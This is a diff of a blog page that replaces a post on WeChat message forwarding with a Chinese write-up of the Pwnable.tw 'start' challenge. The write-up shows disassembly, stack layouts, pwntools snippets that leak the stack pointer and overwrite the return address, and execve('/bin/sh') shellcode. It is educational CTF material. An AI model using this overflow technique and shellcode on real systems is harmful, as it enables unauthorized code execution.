@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="itchat,微信,">
+  <meta name="keywords" content="二进制,Linux,CTF,">
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="我们实验室有个光荣传统，每天早上起床叫醒我的不是闹钟，而是群里雷打不动的安全新闻（其实我免提醒了2333）而这个发送新闻的人，一代一代的传承，我没想到竟然有一天会落在我头上，哭了o(╥﹏╥)o为了不暴露我的起床时间，同时能保质保量的完成任务，我决定做个机器人帮我完成。这就是这片po文的由来啦！ 大杀器itchatintroduction先来一段itchat的官方介绍吧  itchat是一个开源的微">
-<meta name="keywords" content="itchat,微信">
+<meta name="description" content="Pwnable.tw start程序链接：https://pwnable.tw/static/chall/start 0x01 检查保护情况不得不说，checksec这个工作看似简单，用用现成工具就行，但这决定了我们之后漏洞利用的方式，是否栈代码执行，还是ROP。最好多用几个工具进行检查，兼听则明。比如这个程序用peda检查就开启了NX，但实际上并没有。所以理想的话，把shellcode布置到栈上">
+<meta name="keywords" content="二进制,Linux,CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="利用itchat定时转发微信消息">
-<meta property="og:url" content="https://cool-y.github.io/2019/03/23/auto-send-WX/index.html">
+<meta property="og:title" content="【Pwnable.tw】start">
+<meta property="og:url" content="https://cool-y.github.io/2019/10/25/PWNtw-start/index.html">
 <meta property="og:site_name" content="混元霹雳手">
-<meta property="og:description" content="我们实验室有个光荣传统，每天早上起床叫醒我的不是闹钟，而是群里雷打不动的安全新闻（其实我免提醒了2333）而这个发送新闻的人，一代一代的传承，我没想到竟然有一天会落在我头上，哭了o(╥﹏╥)o为了不暴露我的起床时间，同时能保质保量的完成任务，我决定做个机器人帮我完成。这就是这片po文的由来啦！ 大杀器itchatintroduction先来一段itchat的官方介绍吧  itchat是一个开源的微">
+<meta property="og:description" content="Pwnable.tw start程序链接：https://pwnable.tw/static/chall/start 0x01 检查保护情况不得不说，checksec这个工作看似简单，用用现成工具就行，但这决定了我们之后漏洞利用的方式，是否栈代码执行，还是ROP。最好多用几个工具进行检查，兼听则明。比如这个程序用peda检查就开启了NX，但实际上并没有。所以理想的话，把shellcode布置到栈上">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-15T07:35:38.081Z">
+<meta property="og:updated_time" content="2019-10-25T13:13:04.741Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="利用itchat定时转发微信消息">
-<meta name="twitter:description" content="我们实验室有个光荣传统，每天早上起床叫醒我的不是闹钟，而是群里雷打不动的安全新闻（其实我免提醒了2333）而这个发送新闻的人，一代一代的传承，我没想到竟然有一天会落在我头上，哭了o(╥﹏╥)o为了不暴露我的起床时间，同时能保质保量的完成任务，我决定做个机器人帮我完成。这就是这片po文的由来啦！ 大杀器itchatintroduction先来一段itchat的官方介绍吧  itchat是一个开源的微">
+<meta name="twitter:title" content="【Pwnable.tw】start">
+<meta name="twitter:description" content="Pwnable.tw start程序链接：https://pwnable.tw/static/chall/start 0x01 检查保护情况不得不说，checksec这个工作看似简单，用用现成工具就行，但这决定了我们之后漏洞利用的方式，是否栈代码执行，还是ROP。最好多用几个工具进行检查，兼听则明。比如这个程序用peda检查就开启了NX，但实际上并没有。所以理想的话，把shellcode布置到栈上">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://cool-y.github.io/2019/03/23/auto-send-WX/">
+  <link rel="canonical" href="https://cool-y.github.io/2019/10/25/PWNtw-start/">
 
 
 
 
 
-  <title>利用itchat定时转发微信消息 | 混元霹雳手</title>
+  <title>【Pwnable.tw】start | 混元霹雳手</title>
   
 
 
@@ -315,7 +315,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/03/23/auto-send-WX/">
+    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/10/25/PWNtw-start/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Cool-Y">
@@ -332,7 +332,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">利用itchat定时转发微信消息</h1>
+          <h1 class="post-title" itemprop="name headline">【Pwnable.tw】start</h1>
         
 
         <div class="post-meta">
@@ -344,8 +344,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-23T19:48:46+08:00">
-                2019-03-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-25T21:04:14+08:00">
+                2019-10-25
               </time>
             
 
@@ -367,8 +367,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/杂七杂八/" itemprop="url" rel="index">
-                    <span itemprop="name">杂七杂八</span>
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
                   </a>
                 </span>
 
@@ -384,7 +384,7 @@
 
           
           
-             <span id="/2019/03/23/auto-send-WX/" class="leancloud_visitors" data-flag-title="利用itchat定时转发微信消息">
+             <span id="/2019/10/25/PWNtw-start/" class="leancloud_visitors" data-flag-title="【Pwnable.tw】start">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -407,7 +407,7 @@
                 </span>
                 
                 <span title="字数统计">
-                  989 字
+                  1.5k 字
                 </span>
               
 
@@ -421,7 +421,7 @@
                 </span>
                 
                 <span title="阅读时长">
-                  4 分钟
+                  7 分钟
                 </span>
               
             </div>
@@ -442,31 +442,143 @@
       
 
       
-        <p>我们实验室有个光荣传统，每天早上起床叫醒我的不是闹钟，而是群里雷打不动的安全新闻（其实我免提醒了2333）<br>而这个发送新闻的人，一代一代的传承，我没想到竟然有一天会落在我头上，哭了o(╥﹏╥)o<br>为了不暴露我的起床时间，同时能保质保量的完成任务，我决定做个机器人帮我完成。<br>这就是这片po文的由来啦！</p>
-<h1 id="大杀器itchat"><a href="#大杀器itchat" class="headerlink" title="大杀器itchat"></a>大杀器itchat</h1><h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>先来一段<a href="https://itchat.readthedocs.io/zh/latest/" target="_blank" rel="noopener">itchat</a>的官方介绍吧</p>
-<blockquote>
-<p>itchat是一个开源的微信个人号接口，使用python调用微信从未如此简单。<br>使用不到三十行的代码，你就可以完成一个能够处理所有信息的微信机器人。<br>当然，该api的使用远不止一个机器人，更多的功能等着你来发现，比如这些。<br>该接口与公众号接口itchatmp共享类似的操作方式，学习一次掌握两个工具。<br>如今微信已经成为了个人社交的很大一部分，希望这个项目能够帮助你扩展你的个人的微信号、方便自己的生活。</p>
-</blockquote>
-<p>实际上，itchat是对微信网页端的爬虫，所以，网页端可以实现的功能都有，那么，我想要的定时群发微信消息，自然不在话下！</p>
-<h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><ul>
-<li><p>安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install itchat</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>一个简单实例：实现给文件传输助手发送消息</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import itchat</span><br><span class="line">itchat.auto_login()</span><br><span class="line">itchat.send(&apos;Hello, filehelper&apos;, toUserName=&apos;filehelper&apos;)</span><br></pre></td></tr></table></figure>
-<h1 id="实现定时转发"><a href="#实现定时转发" class="headerlink" title="实现定时转发"></a>实现定时转发</h1><p>这个的实现需要注册msg_register,逻辑很简单，当收到指定群里的指定消息时，将消息转发到另一个群。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import itchat</span><br><span class="line">from datetime import datetime</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from itchat.content import TEXT</span><br><span class="line">from itchat.content import *</span><br><span class="line">from apscheduler.schedulers.blocking import BlockingScheduler</span><br><span class="line"></span><br><span class="line">@itchat.msg_register([TEXT], isFriendChat=True, isGroupChat=True, isMpChat=True)</span><br><span class="line">def getContent(msg):</span><br><span class="line">    global g_msg</span><br><span class="line">    groups = itchat.get_chatrooms(update = True)</span><br><span class="line">    for g in groups:</span><br><span class="line">        #print(g[&apos;NickName&apos;])</span><br><span class="line">        if g[&apos;NickName&apos;] == &apos;被转发的群名&apos;:</span><br><span class="line">            from_group = g[&apos;UserName&apos;]</span><br><span class="line">    if &apos;每日安全简讯&apos; in msg[&apos;Content&apos;]:</span><br><span class="line">        print(&quot;get message from &quot; + msg[&apos;FromUserName&apos;])</span><br><span class="line">        if msg[&apos;FromUserName&apos;] == from_group:</span><br><span class="line">            g_msg = msg[&apos;Content&apos;]</span><br><span class="line">            print(&apos;成功获得群消息，等待转发&apos;)</span><br><span class="line">            print(int(time.strftime(&quot;%H%M%S&quot;)))</span><br><span class="line">            while(1):</span><br><span class="line">                if int(time.strftime(&quot;%H%M%S&quot;)) &gt; 80000:</span><br><span class="line">                    SendMessage(g_msg,&apos;发送的对象群名&apos;)</span><br><span class="line">                    g_msg = &apos;&apos;</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def SendMessage(context,gname):</span><br><span class="line">    itchat.get_chatrooms(update = True)</span><br><span class="line">    users = itchat.search_chatrooms(name=gname)</span><br><span class="line">    userName = users[0][&apos;UserName&apos;]</span><br><span class="line">    itchat.send_msg(context,toUserName=userName)</span><br><span class="line">    print(&quot;\n发送时间: &quot; + datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) + &quot;\n&quot; &quot;发送到：&quot; + gname + &quot;\n&quot; + &quot;发送内容：&quot; + context + &quot;\n&quot;)</span><br><span class="line">    print(&quot;*********************************************************************************&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    itchat.auto_login(hotReload=True,enableCmdQR=2)</span><br><span class="line">    itchat.run(blockThread=False)</span><br></pre></td></tr></table></figure></p>
-<h1 id="添加周期防掉线"><a href="#添加周期防掉线" class="headerlink" title="添加周期防掉线"></a>添加周期防掉线</h1><p>据说每三十分钟发送一次消息可防止网页端微信掉线~~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def loop_send():</span><br><span class="line">    nowTime = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">    context = &apos;现在是北京时间 :\n&apos;+ nowTime +&apos;\n\n我们还活着&apos;</span><br><span class="line">    itchat.get_chatrooms(update = True)</span><br><span class="line">    users = itchat.search_friends(name=u&apos;chengkun&apos;)</span><br><span class="line">    userName = users[0][&apos;UserName&apos;]</span><br><span class="line">    itchat.send_msg(context,toUserName=userName)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sched = BlockingScheduler()</span><br><span class="line">    sched.add_job(loop_send,&apos;interval&apos;,minutes=30)</span><br><span class="line">    sched.start()</span><br></pre></td></tr></table></figure></p>
-<h1 id="把程序放在服务器上"><a href="#把程序放在服务器上" class="headerlink" title="把程序放在服务器上"></a>把程序放在服务器上</h1><p>我是在腾讯云有个服务器，因为自己的电脑不可能时时刻刻开机，所以就放在服务器上，方法是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nohup python -u auto_Send.py &gt;&gt; auto_Send.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p>
+        <h1 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw start"></a><a href="http://pwnable.tw/" target="_blank" rel="noopener">Pwnable.tw</a> start</h1><p>程序链接：<a href="https://pwnable.tw/static/chall/start" target="_blank" rel="noopener">https://pwnable.tw/static/chall/start</a></p>
+<h2 id="0x01-检查保护情况"><a href="#0x01-检查保护情况" class="headerlink" title="0x01 检查保护情况"></a>0x01 检查保护情况</h2><p>不得不说，<a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">checksec</a>这个工作看似简单，用用现成工具就行，但这决定了我们之后漏洞利用的方式，是否栈代码执行，还是ROP。<br>最好多用几个工具进行检查，兼听则明。比如这个程序用peda检查就开启了NX，但实际上并没有。所以理想的话，把shellcode布置到栈上就可以了！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec  ./start</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p><strong>RELRO(Relocation Read Only)：尽量使存储区域只读</strong></p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>用IDA逆向分析，汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">保存现场环境esp、_exit</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line"></span><br><span class="line">清空寄存器EAX EBX ECX EDX</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line"></span><br><span class="line">向栈上压入参数</span><br><span class="line">.text:0804806E                 push    3A465443h    CTF:</span><br><span class="line">.text:08048073                 push    20656874h    the</span><br><span class="line">.text:08048078                 push    20747261h    art</span><br><span class="line">.text:0804807D                 push    74732073h    s st</span><br><span class="line">.text:08048082                 push    2774654Ch    Let’</span><br><span class="line"></span><br><span class="line">系统调用80h</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line"></span><br><span class="line">系统调用80h</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line"></span><br><span class="line">恢复栈平衡，返回到_exit</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+<h3 id="INT-80h-系统调用方法"><a href="#INT-80h-系统调用方法" class="headerlink" title="INT 80h 系统调用方法"></a><strong>INT 80h 系统调用方法</strong></h3><p><strong>系统调用的过程</strong>可以总结如下：<br>1． 执行用户程序(如:fork)<br>2． 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。<br>3． 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式）<br>4． 进行中断处理，根据系统调用表调用内核函数。<br>5． 执行内核函数。<br>6． 执行RESTORE_ALL并返回用户模式<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。</p>
+<p><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">关于系统调用的功能号</a>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_exit                 1</span><br><span class="line">#define __NR_fork                 2</span><br><span class="line">#define __NR_read                 3</span><br><span class="line">#define __NR_write                4</span><br><span class="line">#define __NR_open                 5</span><br><span class="line">#define __NR_close                6</span><br><span class="line">#define __NR_waitpid              7</span><br><span class="line">#define __NR_creat                8</span><br><span class="line">#define __NR_link                 9</span><br><span class="line">#define __NR_unlink              10</span><br><span class="line">#define __NR_execve              11</span><br></pre></td></tr></table></figure>
+<p><strong>第一个系统调用：</strong><br>将esp开始的14h字节数据写入标准输出（文件描述符1），即输出”Let’s start the CTF:“</p>
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>eax</th>
+<th>ebx</th>
+<th>ecx</th>
+<th>edx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html" target="_blank" rel="noopener">sys_write</a></td>
+<td>0x04</td>
+<td>unsigned int fd = 1</td>
+<td>const char __user *buf = esp</td>
+<td>size_t count =14h</td>
+</tr>
+<tr>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p><strong>第二个系统调用：</strong><br>从标准输入读取3ch字节到栈空间</p>
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>eax</th>
+<th>ebx</th>
+<th>ecx</th>
+<th>edx</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html" target="_blank" rel="noopener">sys_read</a></td>
+<td>0x03</td>
+<td>unsigned int fd = 1</td>
+<td>char __user *buf = esp</td>
+<td>size_t count  = 3ch</td>
+</tr>
+<tr>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<h3 id="栈变化情况"><a href="#栈变化情况" class="headerlink" title="栈变化情况"></a>栈变化情况</h3><ol>
+<li>程序执行到0804808F：sys_write</li>
+</ol>
+<p>输出14h字节数据：Let’s start the CTF:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    +-----------------+      &lt;----</span><br><span class="line">    |       Let’      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       s st      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       art       |        14h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       the       |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       CTF:      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |   offset _exit  |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+<ol>
+<li>08048097: sys_read</li>
+</ol>
+<p>read函数最多可以读取3ch字节，超出了分配的空间，可以用来覆盖ret_addr和esp。经调试验证，20字节后覆盖ret，24字节后覆盖esp。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EIP+0 found at offset: 20</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ECX] --&gt; offset 0 - size ~32</span><br><span class="line">[ESP] --&gt; offset 24 - size ~8</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0xffcc2764 : offset 0 - size 30 ($sp + -0x18 [-6 dwords])</span><br><span class="line">Reference to pattern buffer not found in memory</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    +-----------------+      &lt;----</span><br><span class="line">    |       aaaa      |         |     </span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |        14h</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+         |</span><br><span class="line">    |       aaaa      |         |</span><br><span class="line">    +-----------------+      &lt;-----</span><br><span class="line">    |       aaaa      |</span><br><span class="line">    +-----------------+</span><br><span class="line">    |    Saved ESP    |</span><br><span class="line">H-&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>现在EIP已经在我们的掌控之中了，关键是如何跳转到布置的shell code中。一般来说，首先会去找JMP ESP指令，这样就能让shellcode获得执行。但这段汇编代码没有，可以利用的只有read和write。如果可以write出Saved ESP的地址，然后覆盖掉offset _exit，就能成功shell。</p>
+<ol>
+<li>泄露Saved ESP</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = p.recvuntil(&apos;:&apos;)  //等待write执行完毕</span><br><span class="line">payload = &apos;a&apos;*0x14 + p32(0x08048087)   //发送溢出数据，覆盖ret为0x08048087-&gt;输出14h字节</span><br><span class="line">p.send(payload)</span><br><span class="line">data = p.recv()    //接收输出数据，其中就有Saved ESP</span><br></pre></td></tr></table></figure>
+<p>debug过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x14 bytes:</span><br><span class="line">    &quot;Let&apos;s start the CTF:&quot;</span><br><span class="line">[DEBUG] Sent 0x18 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  87 80 04 08                            │aaaa│····││</span><br><span class="line">    00000018</span><br><span class="line">[DEBUG] Received 0x14 bytes:</span><br><span class="line">    00000000  **20 53 81**** ff**  01 00 00 00  58 6d 81 ff  00 00 00 00  │ S··│····│Xm··│····│</span><br><span class="line">    00000010  60 6d 81 ff                                         │`m··││</span><br><span class="line">    00000014</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>覆盖RET</li>
+</ol>
+<p>此时程序已经泄露出之前的Saved_esp，栈的情况已经摸清了，然后程序继续执行read，注意read完 add esp, 14h后再ret，因此，ret_addr在esp+14h的地方。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x14 + p32(saved_esp + 20) + shellcode</span><br><span class="line">print p32(saved_esp)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>shellcode</li>
+</ol>
+<p>shellcode同样可以用系统调用的方式执行execve(“/bin/sh”,NULL,NULL)</p>
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>eax</th>
+<th>ebx</th>
+<th>ecx</th>
+<th>edx</th>
+<th>esi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td>
+<td>0x0b</td>
+<td>char __user *</td>
+<td>char <strong>user *</strong>user *</td>
+<td>char <strong>user *</strong>user *</td>
+<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs</a></td>
+</tr>
+<tr>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p>其中，该程序是 32 位，所以我们需要使得</p>
 <ul>
-<li>使用nohup可以让程序在后台运行</li>
-<li>然后将日志输出到auto_Send.log，方便我们后期出bug了排错</li>
-<li>-u可以防止输出到python缓冲区</li>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
 </ul>
-<h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="线程阻塞问题"><a href="#线程阻塞问题" class="headerlink" title="线程阻塞问题"></a>线程阻塞问题</h2><p>这里有两个线程，一个是定时转发，一个是循环发送，因此要设置为itchat.run(blockThread=False)以及sched = BlockingScheduler()否则会卡在某个方法。</p>
-<h2 id="找不到群组"><a href="#找不到群组" class="headerlink" title="找不到群组"></a>找不到群组</h2><p>这是因为users = itchat.search_chatrooms(name=gname)，在搜索的是你保存到通讯录的群组。</p>
-<h2 id="二维码显示不全"><a href="#二维码显示不全" class="headerlink" title="二维码显示不全"></a>二维码显示不全</h2><p>itchat.auto_login(hotReload=True,enableCmdQR=2)，需要设置为2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax     //清空eax</span><br><span class="line">push eax        //0入栈，当作字符/bin/sh结尾</span><br><span class="line">push &apos;/sh&apos;</span><br><span class="line">push &apos;/bin&apos;     //&apos;/sh&apos;为3字节，未对齐&apos; -&gt;&apos;/sh\0&apos;或//sh</span><br><span class="line">mov ebx, esp    //指向/bin/sh地址</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al, 0xb     //系统调用号</span><br><span class="line">int 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode=&apos;&apos;&apos;</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push %s</span><br><span class="line">push %s</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80&apos;&apos;&apos; %(u32(&apos;/sh\0&apos;),u32(&apos;/bin&apos;))</span><br></pre></td></tr></table></figure>
